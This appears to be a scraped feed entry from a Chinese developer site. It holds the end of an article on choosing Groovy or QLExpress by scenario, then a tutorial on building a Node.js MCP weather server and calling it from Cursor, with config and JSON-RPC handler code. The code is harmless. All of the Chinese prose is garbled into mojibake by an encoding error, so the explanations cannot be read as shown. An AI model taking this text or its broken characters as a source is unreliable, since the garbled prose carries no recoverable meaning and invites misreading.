<p>é€‰å¯¹åœºæ™¯ï¼Œæ¯”é€‰å¯¹æŠ€æœ¯æ›´é‡è¦ã€‚</p>
<p><strong>4. å¯¹çº¿ä¸Šè¦æœ‰æ•¬ç•ä¹‹å¿ƒ</strong></p>
<p>åŠ¨æ€èƒ½åŠ›å¾ˆè¯±äººï¼Œä½†ç¨³å®šæ€§æ›´é‡è¦ã€‚åœ¨æ ¸å¿ƒé“¾è·¯ä¸Šï¼šå®å¯æ…¢ä¸€ç‚¹ï¼Œä¹Ÿè¦ç¨³ï¼›å®å¯åŠŸèƒ½å¼±ä¸€ç‚¹ï¼Œä¹Ÿè¦å¯æ§ï¼›å®å¯éº»çƒ¦ä¸€ç‚¹ï¼Œä¹Ÿè¦å¯è¿½æº¯ã€‚</p>
<hr/>
<h2 data-id="heading-48">å†™åœ¨æœ€å</h2>
<p>ä¸¤å¹´çš„ä»£ä»·ï¼Œæ¢æ¥ä¸€ä¸ªæ•™è®­ï¼š<strong>ä¸åˆ†åœºæ™¯å¯¹æ¯”æŠ€æœ¯ï¼Œå°±æ˜¯è€æµæ°“ã€‚</strong></p>
<p>Groovy å¾ˆå¥½ï¼ŒQLExpress ä¹Ÿå¾ˆå¥½ã€‚ä½†åœ¨é«˜é¢‘æ ¸å¿ƒé“¾è·¯ç”¨ Groovyï¼Ÿç¾éš¾ã€‚åœ¨å¤æ‚æ’ä»¶åœºæ™¯ç”¨ QLExpressï¼Ÿå—é™ã€‚</p>
<p>é€‰å¯¹åœºæ™¯ï¼Œæ¯”é€‰å¯¹æŠ€æœ¯æ›´é‡è¦ã€‚</p>
<hr/>
<p><strong>å¦‚æœè¿™ç¯‡æ–‡ç« èƒ½å¸®ä½ é¿å¼€æˆ‘ä»¬è¸©è¿‡çš„å‘ï¼Œè¿™ä¸¤å¹´çš„ä»£ä»·å°±å€¼äº†ã€‚</strong></p>
<p>å‰ä¸¤ç¯‡æŠ€æœ¯æ‹†è§£ï¼š</p>
<ul>
<li>ç¬¬ä¸€ç¯‡ï¼š<a href="https://juejin.cn/post/7582814236584329254" target="_blank" title="https://juejin.cn/post/7582814236584329254">QLExpress å¦‚ä½•åšåˆ°ä¸ç¼–è¯‘å°±èƒ½æ‰§è¡Œï¼Ÿ</a></li>
<li>ç¬¬äºŒç¯‡ï¼š<a href="https://juejin.cn/post/7582923861768601650" target="_blank" title="https://juejin.cn/post/7582923861768601650">è‡ªå®šä¹‰ ClassLoader åŠ¨æ€åŠ è½½ï¼šä¸é‡å¯å°±èƒ½åŠ è½½æ–°ä»£ç ï¼Ÿ</a></li>
</ul>
<p><strong>è®°ä½ï¼šæ¶æ„çš„è‰ºæœ¯ï¼Œä¸åœ¨äºç”¨äº†å¤šå°‘é«˜çº§æŠ€æœ¯ï¼Œè€Œåœ¨äºåœ¨åˆé€‚çš„åœºæ™¯ç”¨äº†åˆé€‚çš„æ–¹æ¡ˆã€‚</strong></p>
<p>é€‰å¯¹äº†ï¼Œå°±æ˜¯ç¥å™¨ï¼›é€‰é”™äº†ï¼Œå°±æ˜¯ç¾éš¾ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥MCPæœ¬è´¨â€”â€”ç¼–å†™è‡ªå®šä¹‰MCP Serverå¹¶é€šè¿‡Cursorè°ƒç”¨]]></title>    <link>https://juejin.cn/post/7583324039303184435</link>    <guid>https://juejin.cn/post/7583324039303184435</guid>    <pubDate>2025-12-14T09:15:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583324039303184435" data-draft-id="7583567658252337178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥MCPæœ¬è´¨â€”â€”ç¼–å†™è‡ªå®šä¹‰MCP Serverå¹¶é€šè¿‡Cursorè°ƒç”¨"/> <meta itemprop="keywords" content="å‰ç«¯,MCP"/> <meta itemprop="datePublished" content="2025-12-14T09:15:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©å¤©æ‰­ç "/> <meta itemprop="url" content="https://juejin.cn/user/3349589831715801"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥MCPæœ¬è´¨â€”â€”ç¼–å†™è‡ªå®šä¹‰MCP Serverå¹¶é€šè¿‡Cursorè°ƒç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349589831715801/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©å¤©æ‰­ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T09:15:19.000Z" title="Sun Dec 14 2025 09:15:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™ç¯‡æ–‡ç« å°†æ·±å…¥æ¢è®¨ <strong>MCP (Model Context Protocol)</strong> çš„æ ¸å¿ƒåŸç†ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰å¤©æ°”å·¥å…·ç¤ºä¾‹ï¼Œæ­ç¤º AI æ¨¡å‹å¦‚ä½•ä¸æœ¬åœ°ç³»ç»Ÿè¿›è¡Œé«˜æ•ˆã€å®‰å…¨çš„äº¤äº’ã€‚</p>
<hr/>
<h3 data-id="heading-0">å®æˆ˜é…ç½®ï¼šå¯åŠ¨ä½ çš„è‡ªå®šä¹‰ MCP Server</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„æ­¥éª¤æ¥é…ç½®å¹¶è¿è¡Œä¸€ä¸ªè‡ªå®šä¹‰çš„ MCP Serverï¼Œè¯¥ Server èƒ½å¤Ÿè·å–ç”µè„‘æ‰€åœ¨åœ°çš„å®æ—¶æ—¶é—´å’Œå¤©æ°”ï¼ˆä¸ä½¿ç”¨ä»£ç†çš„å‰æä¸‹ï¼‰ã€‚</p>
<h4 data-id="heading-1">æ­¥éª¤ 1: ä»£ç å‡†å¤‡</h4>
<p>ä¸‹é¢æ˜¯æˆ‘ç¼–å†™çš„ MCP Server ï¼Œä½ å¯ä»¥å°†ä»£ç åº“æ‹‰å–åˆ°æœ¬åœ°ç›®å½•</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FObjecteee%2Fmcp%2Ftree%2Fmain%2FmyMCP" target="_blank" title="https://github.com/Objecteee/mcp/tree/main/myMCP" ref="nofollow noopener noreferrer">github.com/Objecteee/mâ€¦</a></p>
<h4 data-id="heading-2">æ­¥éª¤ 2: Cursor é…ç½®</h4>
<p>åœ¨ Cursor IDE çš„ <code>mcp.json</code> é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼ŒæŒ‡å®šä½ çš„æœ¬åœ° Server è„šæœ¬çš„è·¯å¾„ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"Real Weather Tool"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"E:\project\mcp\myMCP\index.js"</span>  # è¯·ç¡®ä¿è¿™é‡Œæ˜¯ä½ çš„æœ¬åœ°æ–‡ä»¶è·¯å¾„
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>é…ç½®å®Œæˆåï¼Œæ‚¨å³å¯åœ¨ Cursor çš„å¯¹è¯æ¡†ä¸­é€šè¿‡è‡ªç„¶è¯­è¨€è°ƒç”¨è¿™ä¸ªå·¥å…·ï¼Œä¾‹å¦‚è¯¢é—®ï¼šâ€œç°åœ¨çš„å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿâ€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a3c959432f94e9ab583cc7755007981~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp5aSp5omt56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766308519&amp;x-signature=DmcVhZw2EJvO%2Fc50wzw%2BjoNdu3E%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-3">1. æ ¸å¿ƒæ¶æ„ï¼šä»€ä¹ˆæ˜¯ MCPï¼Ÿ</h3>
<p><strong>MCP (Model Context Protocol)</strong> æ˜¯ç”± Anthropic æå‡ºçš„ä¸€ç§å¼€æ”¾åè®®ï¼Œæ—¨åœ¨è§£å†³ <strong>å¤§å‹è¯­è¨€æ¨¡å‹ (LLM)</strong> ä¸ <strong>å¤–éƒ¨ä¸–ç•Œï¼ˆæœ¬åœ°æ–‡ä»¶ã€æ•°æ®åº“ã€API ç­‰ï¼‰</strong> ä¹‹é—´çš„ä¿¡æ¯é¸¿æ²Ÿã€‚</p>
<ul>
<li><strong>æ²¡æœ‰ MCP æ—¶ï¼š</strong> LLM ä»…ä¾èµ–è®­ç»ƒæ•°æ®ï¼Œæ— æ³•æ„ŸçŸ¥å¤–éƒ¨ä¸–ç•Œçš„å®æ—¶çŠ¶æ€ï¼ˆå¦‚å½“å‰æ—¶é—´ã€å®æ—¶å¤©æ°”ã€æœ¬åœ°ä»£ç ç»“æ„ï¼‰ã€‚å®ƒå°±åƒä¸€ä¸ªâ€œå­¤å²›ä¸Šçš„æ™ºè€…â€ã€‚</li>
<li><strong>æœ‰äº† MCPï¼š</strong> æˆ‘ä»¬ä¸º LLM æä¾›äº†ä¸€ä¸ªæ ‡å‡†åŒ–çš„â€œå·¥å…·æ’åº§â€ã€‚ä»»ä½•éµå¾ª MCP åè®®çš„å¤–éƒ¨ç¨‹åºï¼ˆå³ <strong>MCP Server</strong>ï¼‰éƒ½å¯ä»¥æ’å…¥è¿™ä¸ªæ’åº§ï¼Œä½¿ LLM èƒ½å¤Ÿ <strong>æ§åˆ¶</strong> è¿™äº›å·¥å…·å¹¶ <strong>è·å–</strong> å®æ—¶æ•°æ®ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-4">2. æœ¬è´¨åŸç†ï¼šCursor å¦‚ä½•è¿æ¥å¹¶è°ƒç”¨å·¥å…·ï¼Ÿ</h3>
<p>Cursor è¿æ¥å’Œè°ƒç”¨è‡ªå®šä¹‰ Server çš„è¿‡ç¨‹ï¼Œæœ¬è´¨ä¸Šæ˜¯åŸºäº <strong>æ ‡å‡†è¾“å…¥/è¾“å‡º (Stdio)</strong> çš„ <strong>è¿›ç¨‹é—´é€šä¿¡ (IPC)</strong> ï¼Œå®ƒé‡‡ç”¨ <strong>JSON-RPC</strong> æ ¼å¼è¿›è¡Œæ•°æ®äº¤æ¢ã€‚æˆ‘ä»¬å¯ä»¥å°†æ•´ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p>
<h4 data-id="heading-5">é˜¶æ®µä¸€ï¼šæ¡æ‰‹ï¼ˆHandshakeï¼‰ä¸å·¥å…·å‘ç°</h4>
<ol>
<li><strong>å¯åŠ¨å­è¿›ç¨‹ï¼š</strong> å½“ä½ åœ¨ Cursor ä¸­ä¿å­˜ <code>mcp.json</code> é…ç½®åï¼ŒCursor ä¼šåœ¨åå°å¯åŠ¨ä¸€ä¸ª <strong>å­è¿›ç¨‹ (Child Process)</strong> ï¼Œæ‰§è¡Œä½ æŒ‡å®šçš„ <code>node index.js</code> è„šæœ¬ã€‚</li>
<li><strong>å‘é€è¯¢é—®ï¼š</strong> Cursorï¼ˆçˆ¶è¿›ç¨‹ï¼‰é€šè¿‡ <strong>æ ‡å‡†è¾“å…¥ (stdin)</strong> å‘ä½ çš„è„šæœ¬å‘é€ä¸€æ¡ JSON-RPC æ ¼å¼çš„æ¶ˆæ¯ï¼Œè¯·æ±‚è·å–å¯ç”¨çš„å·¥å…·åˆ—è¡¨ã€‚</li>
<li><strong>è¿”å›åˆ—è¡¨ï¼š</strong> ä½ çš„è„šæœ¬ï¼ˆå­è¿›ç¨‹ï¼‰æ”¶åˆ°è¯·æ±‚åï¼Œä¼šé€šè¿‡ <strong>æ ‡å‡†è¾“å‡º (stdout)</strong> è¿”å›ä¸€ä¸ªåŒ…å«å…¶æ‰€æœ‰å·¥å…·å®šä¹‰ï¼ˆå¦‚ <code>TimeWeatherReporter</code>ï¼‰çš„ JSON å“åº”ã€‚è¿™å¯¹åº”äºä»£ç ä¸­çš„ <code>server.setRequestHandler(ListToolsRequestSchema...)</code>ã€‚</li>
</ol>
<h4 data-id="heading-6">é˜¶æ®µäºŒï¼šå¾…å‘½ä¸å·¥å…·è°ƒç”¨</h4>
<ol>
<li><strong>å¾…å‘½ï¼š</strong> åªè¦ Cursor ä¸å…³é—­ï¼Œä½ çš„è„šæœ¬è¿›ç¨‹å°±ä¼šåœ¨åå°æŒç»­è¿è¡Œï¼Œç­‰å¾…è°ƒç”¨æŒ‡ä»¤ã€‚</li>
<li><strong>LLM è§¦å‘ï¼š</strong> ç”¨æˆ·åœ¨èŠå¤©æ¡†è¾“å…¥æŒ‡ä»¤ï¼ˆå¦‚â€œç°åœ¨çš„å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿâ€ï¼‰ï¼ŒCursor å†…ç½®çš„ AI æ¨¡å‹åˆ†æè¯·æ±‚ï¼Œå†³å®šè°ƒç”¨å“ªä¸ªå·¥å…·ã€‚</li>
<li><strong>å‘é€æŒ‡ä»¤ï¼š</strong> Cursor å‘ä½ çš„è„šæœ¬å‘é€ä¸€æ¡ JSON-RPC <strong>è°ƒç”¨è¯·æ±‚</strong>ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„å·¥å…·åç§°å’Œå‚æ•°ã€‚</li>
<li><strong>æ‰§è¡Œä»»åŠ¡ï¼š</strong> ä½ çš„è„šæœ¬æ¥æ”¶æŒ‡ä»¤ï¼Œæ‰§è¡Œç›¸åº”çš„å†…éƒ¨å‡½æ•°ï¼ˆä¾‹å¦‚è¯·æ±‚ <code>wttr.in</code> è·å–å¤©æ°”ï¼‰ã€‚</li>
<li><strong>åé¦ˆç»“æœï¼š</strong> è„šæœ¬å°†æ‰§è¡Œç»“æœæ‰“åŒ…æˆ JSONï¼Œé€šè¿‡ <strong>stdout</strong> å‘å›ç»™ Cursorã€‚</li>
<li><strong>ç»“æœå±•ç¤ºï¼š</strong> Cursor æ¥æ”¶åˆ°å·¥å…·è¾“å‡ºçš„åŸå§‹æ•°æ®ï¼Œå°†å…¶ä½œä¸º <strong>ä¸Šä¸‹æ–‡</strong> ä¼ é€’ç»™ AI æ¨¡å‹ï¼Œç”±æ¨¡å‹ç»„ç»‡æˆè‡ªç„¶è¯­è¨€çš„ç­”æ¡ˆå›å¤ç”¨æˆ·ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-7">3. ä»£ç å±‚é¢çš„å…³é”®å®ç°ï¼šMCP Server è¿è¡Œæœºåˆ¶ (<code>index.js</code>)</h3>
<p>æˆ‘ä»¬çš„æ³¨æ„åŠ›ä¸è¦æ”¾åœ¨ä»£ç çš„å®ç°ä¸Šï¼Œè¦æ”¾åœ¨ä»£ç çš„æµç¨‹ä¸Šï¼Œå› ä¸ºMCPåªæ˜¯ä¸€ç§è§„èŒƒã€‚</p>
<p>è¿™ä¸ª Node.js è„šæœ¬é€šè¿‡éµå¾ª MCP è§„èŒƒï¼Œå¹¶åˆ©ç”¨æ ‡å‡†è¾“å…¥/è¾“å‡ºæµ (Stdio) å®ç°é€šä¿¡ã€‚ä»¥ä¸‹æ˜¯é©±åŠ¨ MCP Server è¿è¡Œçš„äº”ä¸ªå…³é”®ä»£ç ç‰‡æ®µï¼š</p>
<h4 data-id="heading-8">3.1 æ ¸å¿ƒæ¨¡å—å¯¼å…¥ï¼šå®šä¹‰åè®®ä¸ä¼ è¾“å±‚</h4>

























<table><thead><tr><th><strong>ä»£ç ç‰‡æ®µ</strong></th><th><strong>ä½œç”¨æè¿°</strong></th><th><strong>æ ¸å¿ƒåŸç†</strong></th></tr></thead><tbody><tr><td><code>import { Server } from "@modelcontextprotocol/sdk/server/index.js";</code></td><td><strong>Server å®ä¾‹</strong></td><td>MCP æœåŠ¡ç«¯æ ¸å¿ƒç±»ï¼Œè´Ÿè´£å¤„ç† JSON-RPC è¯·æ±‚å’Œå“åº”ã€‚</td></tr><tr><td><code>import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";</code></td><td><strong>Stdio ä¼ è¾“å±‚</strong></td><td>å£°æ˜é€šä¿¡è½½ä½“æ˜¯åŸºäº <strong>æ ‡å‡†è¾“å…¥/è¾“å‡º (stdin/stdout)</strong> ï¼Œè€Œéç½‘ç»œç«¯å£ã€‚</td></tr><tr><td><code>import { CallToolRequestSchema, ListToolsRequestSchema } from ...</code></td><td><strong>åè®®å®šä¹‰</strong></td><td>å¯¼å…¥è¯·æ±‚çš„ JSON Schemaï¼Œç”¨äºè§£æ Cursor å‘æ¥çš„ä¸åŒç±»å‹çš„æŒ‡ä»¤ã€‚</td></tr></tbody></table>
<h4 data-id="heading-9">3.2 åˆå§‹åŒ– MCP æœåŠ¡å™¨</h4>
<pre><code class="hljs language-vbscript" lang="vbscript"><span class="hljs-keyword">const</span> <span class="hljs-built_in">server</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Server</span>(
  {
    name: <span class="hljs-string">"simple-weather-server"</span>,
    version: <span class="hljs-string">"1.0.0"</span>,
  },
  {
    capabilities: {
      tools: {},
    },
  }
);
</code></pre>
<p><strong>ä½œç”¨ï¼š</strong> åˆ›å»ºæœåŠ¡å™¨å®ä¾‹ã€‚<code>capabilities.tools: {}</code> æ˜ç¡®å‘Šè¯‰ MCPï¼Œè¯¥æœåŠ¡å™¨å…·å¤‡æä¾›å·¥å…·çš„èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-10">3.3 æ³¨å†Œå·¥å…·åˆ—è¡¨ï¼šå“åº”â€œæ¡æ‰‹â€è¯·æ±‚</h4>
<pre><code class="hljs language-php" lang="php">server.<span class="hljs-title function_ invoke__">setRequestHandler</span>(ListToolsRequestSchema, <span class="hljs-title function_ invoke__">async</span> () =&gt; {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">tools</span>: [
      {
        <span class="hljs-attr">name</span>: <span class="hljs-string">"TimeWeatherReporter"</span>,
        <span class="hljs-attr">description</span>: <span class="hljs-string">"Get current system time and weather..."</span>,
        <span class="hljs-attr">inputSchema</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"object"</span>,
          <span class="hljs-attr">properties</span>: {
            <span class="hljs-attr">location</span>: {
              <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>,
              <span class="hljs-attr">description</span>: <span class="hljs-string">"Optional. City name (e.g. 'Beijing')..."</span>,
            },
          },
          <span class="hljs-attr">required</span>: [],
        },
      },
    ],
  };
});
</code></pre>
<p><strong>ä½œç”¨</strong>  è¿™æ˜¯<strong>æ¡æ‰‹é˜¶æ®µï¼ˆHandshakeï¼‰</strong> çš„å…³é”®ã€‚å½“ Cursor é¦–æ¬¡å¯åŠ¨å­è¿›ç¨‹æ—¶ï¼Œä¼šå‘é€ <code>ListToolsRequestSchema</code> è¯·æ±‚ã€‚è¯¥ä»£ç ç‰‡æ®µè´Ÿè´£è¿”å›ä¸€ä¸ªæ¸…æ™°çš„ <strong>JSON Schema</strong> æè¿°ï¼š</p>
<ul>
<li><strong>name:</strong> å·¥å…·çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚</li>
<li><strong>description:</strong> ä¾› AI ç†è§£å·¥å…·ç”¨é€”çš„è‡ªç„¶è¯­è¨€æè¿°ã€‚</li>
<li><strong>inputSchema:</strong> <strong>JSON Schema</strong> æ ¼å¼çš„å‚æ•°å®šä¹‰ï¼ŒAI ä¾èµ–æ­¤ä¿¡æ¯æ¥æ„é€ æ­£ç¡®çš„è°ƒç”¨å‚æ•°ã€‚</li>
</ul>
<h4 data-id="heading-11">3.4 å¤„ç†å·¥å…·è°ƒç”¨ï¼šæ‰§è¡Œä¸šåŠ¡é€»è¾‘</h4>
<pre><code class="hljs language-csharp" lang="csharp">server.setRequestHandler(CallToolRequestSchema, <span class="hljs-keyword">async</span> (request) =&gt; {
  <span class="hljs-keyword">if</span> (request.<span class="hljs-keyword">params</span>.name === <span class="hljs-string">"TimeWeatherReporter"</span>) {
    <span class="hljs-keyword">const</span> location = request.<span class="hljs-keyword">params</span>.arguments?.location;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> getSystemStyleWeather(location); <span class="hljs-comment">// è°ƒç”¨å®é™…çš„ä¸šåŠ¡å‡½æ•°</span>
  }
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Error(<span class="hljs-string">"Tool not found"</span>);
});
</code></pre>
<p><strong>ä½œç”¨ï¼š</strong> è¿™æ˜¯<strong>æ‰§è¡Œé˜¶æ®µï¼ˆExecutionï¼‰</strong> çš„æ ¸å¿ƒã€‚å½“ Cursor çš„ AI å†³å®šè°ƒç”¨å·¥å…·æ—¶ï¼Œä¼šå‘é€ <code>CallToolRequestSchema</code> è¯·æ±‚ã€‚è¿™æ®µä»£ç æ ¹æ® <code>request.params.name</code> åŒ¹é…åˆ°å¯¹åº”çš„ä¸šåŠ¡é€»è¾‘ (<code>getSystemStyleWeather</code>)ï¼Œæ‰§è¡Œåå°†ç»“æœè¿”å›ç»™ Cursorã€‚</p>
<h4 data-id="heading-12">3.5 å¯åŠ¨æœåŠ¡å™¨ï¼šè¿æ¥åˆ° Stdio æµ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> transport = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StdioServerTransport</span>();
  <span class="hljs-keyword">await</span> server.<span class="hljs-title function_">connect</span>(transport);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Simple Weather MCP Server running on stdio"</span>);
}
</code></pre>
<p><strong>ä½œç”¨ï¼š</strong> <strong>è¿æ¥ç‚¹ã€‚</strong> <code>StdioServerTransport()</code> åˆ›å»ºäº†ä¼ è¾“é€šé“ï¼Œ<code>server.connect(transport)</code> åˆ™å°†æœåŠ¡å™¨å®ä¾‹ç»‘å®šåˆ°è¿™ä¸ªé€šé“ä¸Šã€‚è‡³æ­¤ï¼Œæ‚¨çš„ Node.js è„šæœ¬å‡†å¤‡å°±ç»ªï¼Œå¯ä»¥é€šè¿‡ <code>stdin/stdout</code> ä¸ Cursor è¿›ç¨‹è¿›è¡ŒåŒå‘é€šä¿¡ã€‚</p>
<hr/>
<h3 data-id="heading-13">4. æ€»ç»“ï¼šMCP çš„æœ¬è´¨</h3>






























